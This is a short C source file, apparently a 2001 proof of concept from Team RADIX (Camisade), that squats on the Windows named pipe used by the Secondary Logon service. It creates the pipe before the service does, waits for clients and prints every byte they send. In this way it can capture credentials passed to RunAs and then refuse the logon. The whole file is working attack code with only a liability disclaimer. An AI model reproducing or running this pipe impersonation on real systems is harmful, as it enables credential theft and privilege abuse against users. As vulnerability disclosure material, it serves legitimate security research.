// radix1112200101.c - Camisade - Team RADIX - 11-12-2001
//
// Camisade (www.camisade.com) is not responsible for the use or
// misuse of this proof of concept source code.

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <tchar.h>
#include <stdio.h>

#define MAX_IN_BUF   0x1000
#define MAX_OUT_BUF  0x4
#define MAX_INST     0xA

#define SECONDARY_LOGON_PIPE  _T("\\\\.\\pipe\\SecondaryLogon")


void main()
{
   HANDLE hPipe;

   hPipe = CreateNamedPipe(SECONDARY_LOGON_PIPE, PIPE_ACCESS_DUPLEX, 
      PIPE_TYPE_BYTE|PIPE_WAIT, MAX_INST, MAX_OUT_BUF, MAX_IN_BUF, 
      NMPWAIT_USE_DEFAULT_WAIT, 0);

   if (hPipe == INVALID_HANDLE_VALUE)
   {
      printf("Can't create secondary logon pipe.  Error %d\n", GetLastError());
      return;
   }

   printf("Created pipe and waiting for clients...\n");
   if (ConnectNamedPipe(hPipe, 0))
   {
      UCHAR InBuf[MAX_IN_BUF];
      DWORD dwReadCount;
      
      while (ReadFile(hPipe, InBuf, MAX_IN_BUF, &dwReadCount, 0))
      {
         printf("Read %d bytes.  (ASCII Dump)\n", dwReadCount);

         DWORD dwPos;
         for (dwPos = 0; dwPos < dwReadCount; dwPos++)
         {
            printf("%c ", InBuf[dwPos]);

            if ((dwPos % 16) == 0)
               printf("\n");
         }

         DWORD dwReply = ERROR_ACCESS_DENIED;
         DWORD dwWroteCount;
         WriteFile(hPipe, &dwReply, sizeof(DWORD), &dwWroteCount, 0);
      }
   }
   DisconnectNamedPipe(hPipe);
   CloseHandle(hPipe);
}

